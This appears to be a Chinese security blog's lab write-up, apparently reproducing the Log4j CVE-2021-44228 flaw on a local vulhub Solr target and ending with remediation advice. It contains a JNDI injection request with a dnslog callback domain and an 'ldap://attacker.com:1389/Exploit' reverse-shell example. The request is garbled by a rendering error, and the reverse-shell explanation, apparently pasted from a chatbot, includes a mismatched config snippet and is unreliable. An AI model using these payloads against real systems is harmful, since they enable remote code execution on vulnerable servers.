+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>攻击机： kali         192.168.111.128</p>
+<p>靶机：    ubuntu    192.168.111.139</p>
+<p>已提前装好ssh、curl、pip等工具</p>
+<p>安装docker</p>
+<pre tabindex="0"><code>curl -s https://get.docker.com/ | sh</code></pre><p>docker -v查看是否安装成功</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541298.png" alt="image-20230314154157250" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541298.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541298.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541298.png?size=large 2x" data-title="image-20230314154157250" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>安装docker-compose</p>
+<pre tabindex="0"><code>apt  install docker-compose</code></pre><p>或者</p>
+<pre tabindex="0"><code>pip install docker-compose</code></pre><p>docker-compose -v 查看版本</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542399.png" alt="image-20230314154213351" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542399.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542399.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542399.png?size=large 2x" data-title="image-20230314154213351" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>vulhub下载</p>
+<pre tabindex="0"><code>git clone https://github.com/vulhub/vulhub.git</code></pre><p>启动环境</p>
+<pre tabindex="0"><code>docker-compose build</code></pre><pre tabindex="0"><code>docker-compose up -d</code></pre><p>这里我这个命令一直报错，sudo就可以了</p>
+<pre tabindex="0"><code>sudo docker-compose up</code></pre><p>这里测试tomcat ,开起来了</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542373.png" alt="image-20230314154226330" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542373.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542373.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542373.png?size=large 2x" data-title="image-20230314154226330" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>####### 任意代码执行</p>
+<p>进入相关目录</p>
+<pre tabindex="0"><code>cd /vulhub/log4j/CVE-2021-44228</code></pre><p>拉取镜像</p>
+<pre tabindex="0"><code>docker-compose up -d --build</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542994.png" alt="image-20230314154243936" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542994.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542994.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542994.png?size=large 2x" data-title="image-20230314154243936" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>查看端口信息</p>
+<pre tabindex="0"><code>docker-compose ps</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141543433.png" alt="image-20230314154300382" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141543433.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141543433.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141543433.png?size=large 2x" data-title="image-20230314154300382" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>访问</p>
+<p>http://192.168.111.139:8983/solr/#/</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141543412.png" alt="image-20230314154315337" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141543412.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141543412.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141543412.png?size=large 2x" data-title="image-20230314154315337" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>在Dnslog拿一个域名用来测试：   2xwogd.dnslog.cn</p>
+<p>访问</p>
+<p>http://192.168.111.139:8983/solr/admin/cores?action=KaTeX parse error: Expected &lsquo;}&rsquo;, got &lsquo;EOF&rsquo; at end of input: {jndi:ldap://{sys:java.version}.2xwogd.dnslog.cn }</p>
+<p>做到这里了：</p>
+<p><a href="https://blog.csdn.net/weixin_46683781/article/details/122226317"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/weixin_46683781/article/details/122226317</a></p>
+<p>####### 反弹shell</p>
+<p>Log4j漏洞可以被利用反弹shell是因为它涉及到了一个名为JNDI(Java Naming and Directory Interface)的Java API。在这种漏洞利用中，攻击者可以通过构造特定的JNDI数据源名称，将其作为参数传递给Log4j，然后触发Log4j的JNDI lookup操作，从而将攻击者指定的远程服务器IP地址和端口号作为参数传递给JNDI数据源名称。</p>
+<p>这种攻击方式被称为JNDI注入攻击，它利用了JNDI的某些不安全的特性，可以让攻击者在目标系统上执行远程代码，包括反弹shell等操作。</p>
+<p>具体地，攻击者可以构造如下的JNDI数据源名称：</p>
+<pre tabindex="0"><code>javascriptCopy codeldap://attacker.com:1389/Exploit</code></pre><p>其中，<code>ldap</code>表示协议名称，<code>attacker.com</code>表示攻击者控制的远程服务器IP地址，<code>1389</code>表示远程服务器监听的端口号，<code>Exploit</code>为任意名称。</p>
+<p>当受害者使用了受漏洞影响的Log4j版本，并且在应用程序中使用了类似以下的Log4j配置：</p>
+<pre tabindex="0"><code>phpCopy code&lt;appender name=&#34;test&#34; class=&#34;org.apache.log4j.net.SocketAppender&#34;&gt;
+    &lt;param name=&#34;RemoteHost&#34; value=&#34;ldap://attacker.com&#34;/&gt;
+    &lt;param name=&#34;Port&#34; value=&#34;1389&#34;/&gt;
+    &lt;param name=&#34;ReconnectionDelay&#34; value=&#34;10000&#34;/&gt;
+&lt;/appender&gt;</code></pre><p>攻击者可以利用构造的JNDI数据源名称，欺骗Log4j将攻击者指定的远程服务器IP地址和端口号传递给JNDI lookup操作，从而导致攻击者成功地反弹shell或执行其他远程代码。</p>
+<p>因此，为了防止Log4j漏洞被利用反弹shell等操作，需要及时升级受影响的Log4j版本，并关闭JNDI lookup功能，或对JNDI数据源名称进行严格限制和验证。</p>
+<h5 id="修复" class="heading-element"><span>0.0.0.4  修复</span>
+  <a href="#%e4%bf%ae%e5%a4%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>用户：</p>
+<ul>
+<li>
+<p>禁用lookup或JNDI服务</p>
+</li>
+<li>
+<p>升级Apache Log4j和jdk版本</p>
+</li>
+</ul>
+<p>Apache Log4j漏洞的修复主要涉及以下两个方面：</p>
+<ol>
+<li>修复漏洞代码：修复了漏洞代码，以防止攻击者利用漏洞进行攻击。 Log4j漏洞的根本原因在于JNDI Lookup和相关函数中存在的漏洞代码，攻击者可以通过利用此漏洞在受害者的系统中执行任意代码。因此，修复漏洞代码的方案主要集中在禁用JNDI Lookup和相关函数、增强输入验证、使用安全类加载器等方面。</li>
+<li>加强安全机制：在修复漏洞的同时，Apache Log4j也采取了一些措施来加强安全机制，以防止类似漏洞再次出现。具体来说，Apache Log4j采取了以下措施：
+<ul>
+<li>添加安全警报：在Log4j配置中，添加了一个新的安全警报机制，以便及时通知管理员有关异常和潜在的安全问题。</li>
+<li>增加日志信息：在日志记录中增加了更多的详细信息，以帮助管理员更好地跟踪和排查潜在的安全问题。</li>
+<li>提供安全建议：在官方的安全公告中，提供了一些安全建议和最佳实践，以帮助管理员更好地保护其系统和应用程序的安全。</li>
+</ul>
+</li>
+</ol></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:32:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/java%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Java安全">Java安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/15/" class="post-nav-item" rel="prev" title="Java RMI"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Java RMI</a>
+      <a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9/" class="post-nav-item" rel="next" title="Java反序列化基础">Java反序列化基础<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
